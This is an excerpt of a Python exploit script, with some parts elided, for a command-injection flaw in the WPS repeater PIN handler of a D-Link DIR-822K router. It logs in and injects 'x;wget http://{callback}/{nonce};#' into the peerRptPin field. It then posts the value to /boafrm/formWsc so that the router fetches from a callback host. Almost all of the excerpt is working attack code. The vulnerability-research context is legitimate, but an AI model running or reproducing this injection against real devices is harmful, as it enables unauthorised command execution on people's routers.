...
def main():
    parser = argparse.ArgumentParser(description='WPS repeater PIN command injection (WPS disabled branch)')
    ...
    parser.add_argument('--nonce', default='DLINK-DIR-822K-TK-V007')
    ...
    if branch in ('V006', 'V007'):
        ...
        opener = login(base, args.username, args.password)
    payload = 'x;wget http://{callback}/{nonce};#'.format(callback=args.callback, nonce=args.nonce)
    ...
    data = {'setRptPIN': '1', 'submit-url': '/wlwps.htm'}
    data['peerRptPin'] = payload
    try:
        opener.open(base + '/wlwps.htm', timeout=8).read(4096)
    except Exception:
        pass
    try:
        status, body = post(opener, base + '/boafrm/formWsc', data, base + '/wlwps.htm', timeout=20)
        error = ''
